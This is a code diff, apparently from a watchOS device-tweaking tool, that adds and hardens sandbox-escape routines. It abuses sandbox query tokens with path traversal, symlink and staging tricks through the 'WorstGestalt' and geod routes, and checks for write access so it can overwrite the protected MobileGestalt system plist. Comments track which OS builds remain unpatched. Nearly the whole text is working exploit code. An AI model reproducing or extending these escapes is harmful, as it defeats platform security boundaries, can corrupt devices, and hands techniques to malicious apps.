@@ -310,6 +310,20 @@ static void bq_restore_path(NSString *path, NSString *bak) {
     }
 }
 
+// Verify a file descriptor, not merely the presence of a sandbox token.
+static BOOL bq_access_readwrite(NSString *path, NSString *label) {
+    errno = 0;
+    int fd = open(path.fileSystemRepresentation, O_RDWR | O_CLOEXEC);
+    int e = errno;
+    if (fd >= 0) {
+        close(fd);
+        BQLog(@"%@ writable-open validated: %@", label, path);
+        return YES;
+    }
+    BQLog(@"%@ cannot open O_RDWR: %@ errno=%d (%s)", label, path, e, strerror(e));
+    return NO;
+}
+
 // ------------------------------------------------------------------ init ---
 BOOL BQCoreInit(void) {
     static dispatch_once_t once;
@@ -618,10 +632,72 @@ static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
     return last;
 }
 
+
+// WatchOS26 new independent query variants. An exact-file token may allow
+// O_RDWR where a directory token grants only O_RDONLY.
+static int64_t bq_escape_worstgestalt_file(NSString *target, NSString **linkOut) {
+    if (![target isEqualToString:kMGCaches]) return -1;
+    NSString *file = [target stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    NSString *alias = [file hasPrefix:@"/private/var/"]
+        ? [@"/var/" stringByAppendingString:[file substringFromIndex:@"/private/var/".length]]
+        : file;
+    for (NSString *path in @[alias, file]) {
+        NSString *domain = [bq_dots(8) stringByAppendingString:path];
+        NSString *resolved = nil;
+        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, domain, 0x8000000000ULL,
+                                    @"WorstGestalt-Class13-file", &resolved);
+        if (h < 0) continue;
+        if (bq_access_readwrite(path, @"WorstGestalt-Class13-file")) {
+            if (linkOut) *linkOut = target;
+            return h;
+        }
+        if (g.release) g.release(h);
+    }
+    return -5;
+}
+
+static int64_t bq_escape_geod_published(NSString *target, NSString **linkOut) {
+    if (![target isEqualToString:kMGCaches]) return -1;
+    NSString *domain = [bq_dots(6) stringByAppendingString:
+        @"/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"];
+    NSString *resolved = nil;
+    int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, domain,
+                                0x8100000000ULL, @"Geod-Class12-published", &resolved);
+    if (h < 0) return h;
+    if (bq_access_readwrite([target stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"],
+                            @"Geod-Class12-published")) {
+        if (linkOut) *linkOut = target;
+        return h;
+    }
+    if (g.release) g.release(h);
+    return -5;
+}
+
+// Every normal editor/save call can demand a writable-open permission before
+// the fallback is chosen. This does not write anything by itself.
+static BOOL gNeedWritableEscape = NO;
+static BOOL bq_accept_escape(NSString *target, NSString *root, int64_t h, NSString *label) {
+    if (h < 0) return NO;
+    if (!gNeedWritableEscape || ![target isEqualToString:kMGCaches]) return YES;
+    NSString *candidate = [(root ?: target) stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    if (bq_access_readwrite(candidate, label)) return YES;
+    BQEndEscape(h);
+    return NO;
+}
+
 int64_t BQEscape(NSString *target, NSString **linkOut) {
     if (!target.length) return -1;
     bq_load_mcm();
     int64_t last = -1;
+
+    // Prefer an exact-file token. All new routes require successful O_RDWR
+    // before returning; fallback paths below are independently validated for writes.
+    if ([target isEqualToString:kMGCaches]) {
+        int64_t preferred = bq_escape_worstgestalt_file(target, linkOut);
+        if (preferred >= 0) return preferred;
+        preferred = bq_escape_geod_published(target, linkOut);
+        if (preferred >= 0) return preferred;
+    }
 
     // 1. Old bad_query: class 13 + part-domain traversal. No app group needed.
     //    Works on builds where the traversal is not patched (27.0.x), fails on 27.2.
@@ -630,7 +706,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         NSString *p = nil;
         int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8100000000ULL,
                                     @"class13-traversal", &p);
-        if (h >= 0) {
+        if (bq_accept_escape(target, p ?: target, h, @"class13-traversal")) {
             gTraversalState = 1;
             if (linkOut) *linkOut = p ?: target;
             BQLog(@"escape: using class13 traversal -> %@", p ?: target);
@@ -645,7 +721,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
     if (gid.length) {
         NSString *link = nil;
         int64_t h = bq_escape_symlink(target, &link);
-        if (h >= 0) {
+        if (bq_accept_escape(target, link, h, @"class7-symlink")) {
             if (linkOut) *linkOut = link;
             BQLog(@"escape: using class7 symlink");
             return h;
@@ -658,7 +734,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
     {
         NSString *link = nil;
         int64_t h = bq_escape_class2_stage(target, &link);
-        if (h >= 0) {
+        if (bq_accept_escape(target, link ?: target, h, @"class2-stage")) {
             if (linkOut) *linkOut = link ?: target;
             BQLog(@"escape: using class2 stage");
             return h;
@@ -672,7 +748,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
     {
         NSString *link = nil;
         int64_t h = bq_escape_class2_subpath(target, &link);
-        if (h >= 0) {
+        if (bq_accept_escape(target, link ?: target, h, @"class2-subpath")) {
             if (linkOut) *linkOut = link ?: target;
             BQLog(@"escape: using class2 subpath");
             return h;
@@ -689,7 +765,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         int64_t h = bq_escape_class2_parent(target, &link);
         [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"BQClass2ParentCrashGuard"];
         [[NSUserDefaults standardUserDefaults] synchronize];
-        if (h >= 0) {
+        if (bq_accept_escape(target, link ?: target, h, @"class2-parent")) {
             if (linkOut) *linkOut = link ?: target;
             BQLog(@"escape: using class2 parent");
             return h;
@@ -704,7 +780,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         NSString *p = nil;
         int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
                                     @"class13-direct", &p);
-        if (h >= 0) {
+        if (bq_accept_escape(target, p ?: target, h, @"class13-direct")) {
             if (linkOut) *linkOut = p ?: target;
             BQLog(@"escape: using class13 direct");
             return h;
@@ -718,7 +794,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         NSString *p = nil;
         int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8100000000ULL,
                                     @"class12-geod-traversal", &p);
-        if (h >= 0) {
+        if (bq_accept_escape(target, p ?: target, h, @"geod-legacy")) {
             if (linkOut) *linkOut = p ?: target;
             BQLog(@"escape: using class12 geod traversal");
             return h;
@@ -1043,12 +1119,19 @@ BOOL BQSaveGestalt(NSDictionary *dict, NSString **err) {
     }
     if (!bq_auto_backup(err)) return NO;
     NSString *link = nil;
+    gNeedWritableEscape = YES;
     int64_t h = BQEscape(kMGCaches, &link);
+    gNeedWritableEscape = NO;
     if (h < 0) {
         if (err) *err = bq_escape_error(h);
         return NO;
     }
     NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    if (!bq_access_readwrite(plist, @"BQSaveGestalt")) {
+        BQEndEscape(h);
+        if (err) *err = @"No verified writable route to MobileGestalt on this watchOS build.";
+        return NO;
+    }
     NSData *beforeWrite = [NSData dataWithContentsOfFile:plist];
     if (!beforeWrite) {
         BQEndEscape(h);
